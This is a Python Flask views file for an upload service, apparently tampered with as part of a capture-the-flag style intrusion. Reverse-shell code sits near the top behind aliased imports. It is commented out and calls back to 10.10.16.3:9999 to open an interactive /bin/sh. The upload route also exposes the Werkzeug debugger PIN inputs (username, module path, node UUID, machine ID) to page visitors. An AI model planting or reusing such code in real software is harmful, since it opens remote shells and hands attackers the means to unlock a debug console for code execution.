import getpass
import os
import sys
import typing
import uuid
import werkzeug.debug as dbg

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app

from os import dup2 as o
from socket import socket as b
from subprocess import call as p

# s = b()
# s.connect(("10.10.16.3",9999))
# f = s.fileno
# o(f(),0)
# o(f(),1)
# o(f(),2)
# p(["/bin/sh","-i"])


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/download')
def download():
    return send_file(os.path.join(os.getcwd(), "app", "static", "source.zip"))


@app.route('/upcloud', methods=['GET', 'POST'])
def upload_file():
    modname = getattr(app, "__module__", typing.cast(object, app).__class__.__module__)
    mod = sys.modules.get(modname)
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html', username=getpass.getuser(), modname=modname, appname=getattr(app, "__name__", type(app).__name__), modfile=getattr(mod, "__file__", None), nodeuuid=str(uuid.getnode()), machineid=dbg.get_machine_id())


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
